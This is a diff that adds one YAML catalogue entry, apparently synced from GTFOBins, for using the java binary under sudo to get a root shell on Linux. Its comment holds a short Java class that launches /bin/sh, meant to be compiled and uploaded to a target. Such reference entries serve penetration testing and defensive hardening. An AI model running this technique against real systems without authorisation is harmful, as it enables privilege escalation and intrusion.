@@ -1,0 +1,28 @@
+id: gtfobins/java/shell/sudo
+type: binary
+platform: linux
+name: java
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: java Shell
+  comment: "The `Shell.class` class file can be compiled offline, then uploaded to the target:\n\n```\n\
+    cat >Shell.java <<EOF\npublic class Shell {\n    public static void main(String[] args) throws Exception\
+    \ {\n        new ProcessBuilder(\"/bin/sh\").inheritIO().start().waitFor();\n    }\n}\nEOF\n\njavac\
+    \ Shell.java\n```"
+references:
+- https://gtfobins.github.io/gtfobins/java/
+tags:
+- linux
+- unix
+- gtfobins
